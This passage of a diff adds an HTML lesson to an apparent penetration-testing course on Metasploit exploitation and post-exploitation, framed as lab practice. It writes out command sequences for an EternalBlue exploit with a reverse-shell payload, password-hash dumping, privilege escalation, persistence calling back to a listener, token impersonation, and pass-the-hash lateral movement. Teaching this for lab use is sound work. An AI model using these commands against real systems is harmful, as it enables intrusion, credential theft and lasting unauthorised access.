+                <p>Master exploitation techniques and maintaining access after successful penetration.</p>
+            </div>
+            
+            <div class="lesson">
+                <h3>Exploitation Fundamentals</h3>
+                <p>Understanding the exploitation process:</p>
+                
+                <h4>Vulnerability to Exploit</h4>
+                <p>The process of turning a vulnerability into a working exploit:</p>
+                <ol>
+                    <li>Vulnerability Discovery</li>
+                    <li>Exploit Development</li>
+                    <li>Payload Delivery</li>
+                    <li>Exploit Execution</li>
+                    <li>Post-Exploitation</li>
+                </ol>
+                
+                <h4>Types of Exploits</h4>
+                <ul>
+                    <li><strong>Remote Code Execution (RCE)</strong>: Execute code on a remote system</li>
+                    <li><strong>Local Privilege Escalation (LPE)</strong>: Gain higher privileges on a local system</li>
+                    <li><strong>Denial of Service (DoS)</strong>: Make a service unavailable</li>
+                    <li><strong>Web Application Exploits</strong>: Target web applications and services</li>
+                </ul>
+            </div>
+            
+            <div class="lesson">
+                <h3>Metasploit Framework</h3>
+                <p>The Metasploit Framework is the most widely used penetration testing tool:</p>
+                
+                <h4>Metasploit Components</h4>
+                <ul>
+                    <li><strong>Exploits</strong>: Code that uses a vulnerability</li>
+                    <li><strong>Payloads</strong>: Code that runs after successful exploitation</li>
+                    <li><strong>Auxiliary Modules</strong>: Scanning, fuzzing, and other tools</li>
+                    <li><strong>Encoders</strong:> Avoid detection by antivirus software</li>
+                    <li><strong>Post-Exploitation Modules</strong>: Actions after gaining access</li>
+                </ul>
+                
+                <h4>Basic Metasploit Usage</h4>
+                <div class="code-block">
+                    <span class="command">msfconsole</span> <span class="comment"># Start Metasploit</span><br>
+                    <span class="command">msf6 > search eternalblue</span> <span class="comment"># Search for exploits</span><br>
+                    <span class="command">msf6 > use exploit/windows/smb/ms17_010_eternalblue</span> <span class="comment"># Select exploit</span><br>
+                    <span class="command">msf6 > set RHOSTS 192.168.1.1</span> <span class="comment"># Set target</span><br>
+                    <span class="command">msf6 > set PAYLOAD windows/meterpreter/reverse_tcp</span> <span class="comment"># Set payload</span><br>
+                    <span class="command">msf6 > set LHOST 192.168.1.100</span> <span class="comment"># Set listener IP</span><br>
+                    <span class="command">msf6 > exploit</span> <span class="comment"># Launch exploit</span>
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>Post-Exploitation Techniques</h3>
+                
+                <h4>Meterpreter</h4>
+                <p>Meterpreter is an advanced, multi-function payload:</p>
+                <div class="code-block">
+                    <span class="command">meterpreter > sysinfo</span> <span class="comment"># System information</span><br>
+                    <span class="command">meterpreter > getuid</span> <span class="comment"># Current user</span><br>
+                    <span class="command">meterpreter > hashdump</span> <span class="comment"># Dump password hashes</span><br>
+                    <span class="command">meterpreter > shell</span> <span class="comment"># Get system shell</span><br>
+                    <span class="command">meterpreter > upload /local/file C:\\remote\\path</span> <span class="comment"># Upload file</span><br>
+                    <span class="command">meterpreter > download C:\\file.txt /local/path</span> <span class="comment"># Download file</span>
+                </div>
+                
+                <h4>Privilege Escalation</h4>
+                <p>Techniques for gaining higher privileges:</p>
+                <div class="code-block">
+                    <span class="command">meterpreter > getsystem</span> <span class="comment"># Attempt privilege escalation</span><br>
+                    <span class="command">meterpreter > run post/windows/gather/enum_logged_on_users</span> <span class="comment"># Enumerate users</span><br>
+                    <span class="command">meterpreter > run post/multi/recon/local_exploit_suggester</span> <span class="comment"># Suggest exploits</span>
+                </div>
+                
+                <h4>Persistence</h4>
+                <p>Maintaining access after initial compromise:</p>
+                <div class="code-block">
+                    <span class="command">meterpreter > run persistence -U -i 10 -p 443 -r 192.168.1.100</span> <span class="comment"># Create persistence</span><br>
+                    <span class="command">meterpreter > run post/windows/manage/persistence_exe</span> <span class="comment"># Alternative method</span>
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>Lateral Movement</h3>
+                
+                <h4>Pass-the-Hash</h4>
+                <p>Using password hashes to authenticate without knowing the plaintext password:</p>
+                <div class="code-block">
+                    <span class="command">meterpreter > use incognito</span> <span class="comment"># Load incognito</span><br>
+                    <span class="command">meterpreter > list_tokens -u</span> <span class="comment"># List available tokens</span><br>
+                    <span class="command">meterpreter > impersonate_token DOMAIN\\Administrator</span> <span class="comment"># Impersonate token</span>
+                </div>
+                
+                <h4>PSExec</h4>
+                <p>Executing processes on remote systems:</p>
+                <div class="code-block">
+                    <span class="command">msf6 > use exploit/windows/smb/psexec</span><br>
+                    <span class="command">msf6 > set RHOSTS 192.168.1.2</span><br>
+                    <span class="command">msf6 > set SMBUser administrator</span><br>
+                    <span class="command">msf6 > set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c</span><br>
+                    <span class="command">msf6 > exploit</span>
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>Practice Exercise</h3>
+                <p>Perform exploitation and post-exploitation in a test environment:</p>
+                <ol>
+                    <li>Set up vulnerable Windows and Linux systems</li>
+                    <li>Use Metasploit to exploit known vulnerabilities</li>
+                    <li>Gain Meterpreter sessions on target systems</li>
+                    <li>Perform privilege escalation</li>
+                    <li>Establish persistence mechanisms</li>
+                    <li>Move laterally between systems</li>
+                    <li>Document the entire attack chain</li>
+                </ol>
+            </div>
+        </div>
+    </section>
 
     <!-- Course Details -->
     <section class="course-details" id="course-details">
@@ -1689,3 +3240,4 @@ HTTP is the mechanism by which HTML documents are transported across the interne
     </script>
 </body>
 </html>
+
